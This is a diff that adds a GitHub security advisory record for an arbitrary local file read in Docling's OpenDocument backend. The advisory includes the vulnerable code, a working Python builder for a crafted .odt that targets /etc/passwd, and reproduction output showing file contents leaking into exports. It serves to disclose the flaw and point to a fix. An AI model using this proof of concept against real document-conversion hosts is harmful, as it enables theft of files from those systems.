@@ -1,0 +1,75 @@
+{
+  "id": "GHSA-4xhp-xg4w-8ppm",
+  "modified": "2026-10-05T22:45:04.575212267Z",
+  "published": "2026-10-05T22:33:52Z",
+  "aliases": [
+    "CVE-2026-105751"
+  ],
+  "summary": "Docling: Arbitrary local file read via draw:image xlink:href in the OpenDocument backend",
+  "details": "## Summary\n \nThe ODF backend resolves the `xlink:href` of a `draw:image` element as a filesystem path whenever\nthe referenced part is not found inside the document archive. The value comes straight from\n`content.xml`, so it is document content, and it is used with no scheme check, no confinement to\nthe extraction directory, and without consulting the `enable_local_fetch` / `enable_remote_fetch`\ncontrols that the other backends use for exactly this decision.\n \nConverting a crafted `.odt` therefore causes Docling to open an attacker-named absolute path on\nthe converting host. Where the target decodes as an image, its complete contents are embedded in\nthe resulting `DoclingDocument` and appear in the HTML, Markdown and JSON exports.\n \nBoth the read and the disclosure are confirmed by execution. The trigger is a 452-byte archive\ncontaining two entries.\n \n## Affected component\n \n`docling/backend/opendocument_backend.py`, in `_image_ref_from_odf_image`:\n \n```python\nimage_url = _odf_image_href(image)\n...\nif image_data is None and odf_obj is not None and image_url:\n    try:\n        image_data = odf_obj.get_part(image_url)\n    except Exception:\n        image_data = None\n \nif image_data is None and image_url:\n    image_path = Path(image_url)\n    if image_path.is_file():\n        image_data = image_path.read_bytes()\n```\n \n`_odf_image_href` returns the `xlink:href` attribute. The in-archive lookup is attempted first;\nwhen it fails, the same string is handed to `Path` and read from disk.\n \nThe only filter on the way in is `_odf_image_can_be_bitmap`, which admits any path whose suffix is\none of `.bmp`, `.gif`, `.jpeg`, `.jpg`, `.png`, `.tif`, `.tiff`, `.webp`, **or empty**. The\nempty-suffix case is what admits most paths of interest on a Unix host, `/etc/passwd` among them.\n \n### The backend does not use the project's own fetch controls\n \n```\n$ grep -n \"enable_local_fetch\\|enable_remote_fetch\\|image_resource_loader\" \\\n      docling/backend/opendocument_backend.py\n$\n```\n \nNothing. The HTML, Markdown, EPUB and XBRL backends all resolve image resources through\n`docling/backend/utils/image_resource_loader.py`, where `enable_local_fetch` and\n`enable_remote_fetch` both default to `False`. The ODF backend reimplements image loading and does\nnot consult either, so the default of not fetching local resources is not applied on this path.\n \nThat is the substance of the report: the control exists, it is off by default, and this backend\ndoes not reach it.\n \n## Affected versions\n \nIntroduced by commit `e2afe381`, \"feat: Add OpenDocument backend support and improve ODF\nimage/table handling\" (#3480), 2026-06-24. First released in **v2.107.0**.\n \n**Affected: `docling` \u003e= 2.107.0, up to and including 2.117.0 and current `main`\n(`52d8a6f24de7318a9ad4be2a7361ba93fc81a5c1`).**\n \nSubsequent commits touching this file — `2c3e55b3` (skip a `draw:object` with a missing embedded\npart), `b627ca91` (preserve content inside sections), `2ec33bc7` (guard backend imports) — address\nunrelated defects and leave the path resolution unchanged.\n \nReproduced on two independent machines:\n \n| | |\n|---|---|\n| Python 3.12.3 | `docling-slim` 2.117.0, `docling-core` 2.88.0, `odfdo` 3.23.1 |\n| Python 3.14.4 | same releases, and again against `main` clones on `sys.path` |\n \n## Proof of concept\n \n### Trigger\n \nAn `.odt` needs only `mimetype` and `content.xml`. No manifest, no styles, no embedded image part.\n \n```python\nimport zipfile\n \nCONTENT = (\n    '\u003c?xml version=\"1.0\"?\u003e\u003coffice:document-content '\n    'xmlns:office=\"urn:oasis:names:tc:opendocument:xmlns:office:1.0\" '\n    'xmlns:text=\"urn:oasis:names:tc:opendocument:xmlns:text:1.0\" '\n    'xmlns:draw=\"urn:oasis:names:tc:opendocument:xmlns:drawing:1.0\" '\n    'xmlns:xlink=\"http://www.w3.org/1999/xlink\" office:version=\"1.2\"\u003e'\n    '\u003coffice:body\u003e\u003coffice:text\u003e\u003ctext:p\u003e'\n    '\u003cdraw:frame\u003e\u003cdraw:image xlink:href=\"{href}\"/\u003e\u003c/draw:frame\u003e'\n    '\u003c/text:p\u003e\u003c/office:text\u003e\u003c/office:body\u003e\u003c/office:document-content\u003e'\n)\n \ndef build(path, href):\n    with zipfile.ZipFile(path, \"w\", zipfile.ZIP_DEFLATED) as z:\n        zi = zipfile.ZipInfo(\"mimetype\", date_time=(1980, 1, 1, 0, 0, 0))\n        zi.compress_type = zipfile.ZIP_STORED\n        z.writestr(zi, \"application/vnd.oasis.opendocument.text\")\n        zi = zipfile.ZipInfo(\"content.xml\", date_time=(1980, 1, 1, 0, 0, 0))\n        zi.compress_type = zipfile.ZIP_DEFLATED\n        z.writestr(zi, CONTENT.format(href=href))\n \nbuild(\"odt_etc_passwd.odt\", \"/etc/passwd\")\nbuild(\"odt_control.odt\", \"Pictures/image1.png\")\n```\n \nWith the fixed archive timestamp above the artifacts are byte-reproducible:\n \n| File | Bytes | sha256 |\n|---|---|---|\n| `odt_etc_passwd.odt` | 452 | `edf2497514fd6c03635c2f87c0d5a0981ec07dea6426363784c8c4ff2add4634` |\n| `odt_control.odt` | 458 | `da5c44f9e9644051813d62de04ece84691942425afcfb463b4d1371b37a003c6` |\n \nWithout the fixed timestamp the archive size varies by a few bytes with the length of the `href`\nstring, which is the only part that changes.\n \n### Conversion — public API, default install, no options set\n \n```python\nfrom pathlib import Path\nfrom docling.document_converter import DocumentConverter\nfrom docling_core.types.doc import ImageRefMode\n \ndoc = DocumentConverter().convert(Path(\"trigger.odt\")).document\nprint(doc.export_to_html(image_mode=ImageRefMode.EMBEDDED))\n```\n \nThe read itself is observed with `sys.addaudithook`, which records every `open` without modifying\nDocling or any dependency.\n \nA self-contained script, `odf_repro.py`, is attached. It creates its own canary image in a fresh\ntemporary directory, builds the trigger and the control, converts both, and reports the read, the\ndisclosure in each export format, and ten consecutive repetitions.\n \n### Output — disclosure\n \n```\npython        3.14.4\ndocling       /home/asus/CVE/docling/docling/__init__.py\ncanary        /tmp/odf_canary_eoz7_2d8/canary.png  (104 B, sha256 b9c57d2dc728be7f)\ntrigger       odf_trigger.odt  (471 B, sha256 341d060294c90447)\n \nfile opened outside document : True  ['/tmp/odf_canary_eoz7_2d8/canary.png', ...]\ncontents present in html     : True\ncontents present in markdown : True\ncontents present in json     : True\n \ncontrol (in-archive href)    : disclosed=False\ndeterminism                  : 10/10\n \n----------------------------------------------------------------------\nRESULT: REPRODUCED\n----------------------------------------------------------------------\n```\n \nThe canary is written outside the working tree and is never placed inside the archive. The sha256\nof the base64-decoded image in the export matches the source file exactly.\n \nThe control is the ordinary ODF convention, `xlink:href=\"Pictures/image1.png\"`. It resolves inside\nthe archive and discloses nothing, through the same function. That is what separates this from\nintended behaviour.\n \n### Output — read of a non-image path\n \nThe read happens before any decoding is attempted, so it is not confined to image files.\n \n```\n/etc/passwd                  status=success  opened=['/etc/passwd']\n/etc/does_not_exist_9c1f     status=success  opened=[]\n```\n \nBoth conversions report success. Only the existing path is opened. Nothing in the conversion\nresult distinguishes the two cases, so the difference is usable as a silent file-existence oracle\nagainst arbitrary paths.\n \n## Impact\n \nConfirmed by execution, default install, no options set:\n \n1. **Arbitrary local file read.** A converted document names an absolute path and Docling opens\n   it. Observed for `/etc/passwd` and for paths with no extension.\n2. **Silent file existence and readability oracle.** Present and absent paths are distinguishable\n   by side effect while conversion reports success either way.\n3. **Full content disclosure.** Where the target decodes as an image, its bytes are embedded in\n   the `DoclingDocument` and appear base64-encoded in the HTML, Markdown and JSON exports, byte\n   for byte.\nThe disclosure in (3) is bounded to files Pillow can decode, and I would rather state that plainly\nthan overstate the finding. On a document-conversion host that class is not marginal: page images\nfrom other conversions, scanned documents, cached artifacts and screenshots are exactly what such\na service accumulates. The project README describes \"local execution capabilities for sensitive\ndata and air-gapped environments\", which is the deployment where host-side file disclosure carries\nthe most weight.\n \n**Not demonstrated, and stated as such.** I have not tested this behind `docling-serve`. `.odt` is\nan accepted input format there, `json` is an accepted output format, and the service defaults to\nbinding `0.0.0.0` with `DOCLING_SERVE_API_KEY` unset, so on the face of it the same defect is\nreachable by an unauthenticated remote caller with no user interaction. I have not run it, so I am\nraising it for you to check rather than presenting it as a result.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "docling",
+        "purl": "pkg:pypi/docling"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "2.107.0"
+            },
+            {
+              "fixed": "2.120.3"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "2.107.0",
+        "2.108.0",
+        "2.109.0",
+        "2.110.0",
+        "2.111.0",
+        "2.112.0",
+        "2.113.0",
+        "2.114.0",
+        "2.115.0",
+        "2.116.0",
+        "2.117.0",
+        "2.118.0",
+        "2.118.1",
+        "2.119.0",
+        "2.120.1",
+        "2.120.2"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-4xhp-xg4w-8ppm/GHSA-4xhp-xg4w-8ppm.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/docling-project/docling/security/advisories/GHSA-4xhp-xg4w-8ppm"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/docling-project/docling/pull/4015"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/docling-project/docling/commit/6ee9965adfc364b3696a67c825ec2f0d9cee4311"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/docling-project/docling"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/docling-project/docling/releases/tag/v2.120.3"
+    }
+  ]
+}
